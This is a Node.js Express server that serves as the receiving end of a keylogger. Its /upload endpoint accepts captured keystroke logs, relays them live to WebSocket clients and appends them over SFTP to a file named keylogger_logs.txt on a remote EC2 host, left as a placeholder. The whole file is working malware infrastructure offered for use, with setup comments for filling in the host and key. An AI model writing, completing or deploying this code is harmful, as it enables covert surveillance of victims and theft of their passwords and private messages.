const express = require('express');
const bodyParser = require('body-parser');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const { Client } = require('ssh2');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// WebSocket logic to handle client connections
wss.on('connection', ws => {
    console.log('Client connected via WebSocket');
    ws.on('close', () => {
        console.log('Client disconnected');
    });
});

// Function to send log content to a remote server via SSH
const sendLogViaSSH = (logContent) => {
    const conn = new Client();
    conn.on('ready', () => {
        console.log('SSH Client :: ready');
        conn.sftp((err, sftp) => {
            if (err) throw err;

            // Create a writable stream to a file on the remote server
            const writeStream = sftp.createWriteStream('/home/ubuntu/keylogger_logs.txt', {
                flags: 'a', // Append to the file
            });

            writeStream.on('finish', () => {
                console.log('Log uploaded successfully via SSH.');
                conn.end();
            });

            writeStream.on('error', (streamErr) => {
                console.error('SFTP stream error:', streamErr);
                conn.end();
            });

            writeStream.write(logContent);
            writeStream.end();
        });
    }).connect({
        host: 'YOUR_EC2_PUBLIC_IP', // Replace with your EC2 public IP or DNS
        port: 22,//your port ex:3000
        username: 'ubuntu', // Or your EC2 instance username
        privateKey: require('fs').readFileSync(path.join(__dirname, 'path/to/your/private_key.pem'))
    });

    conn.on('error', (err) => {
        console.error('SSH connection error:', err);
    });
};

// POST endpoint to receive log from keylogger
app.post('/upload', (req, res) => {
    const logContent = req.body.log;
    if (!logContent) {
        return res.status(400).send('No log received');
    }

    console.log('--- Log Received ---');
    console.log(logContent);

    // Send the new, complete log to all connected WebSocket clients
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(logContent);
        }
    });

    // Send the same log to the EC2 server via SSH
    sendLogViaSSH(logContent);

    res.send('Log received and forwarded to clients and EC2 server!');
});

// Serve the frontend HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

server.listen(PORT, () => {
    console.log(`Server running at http://<ec2-public-ip/>:${PORT}`);
});
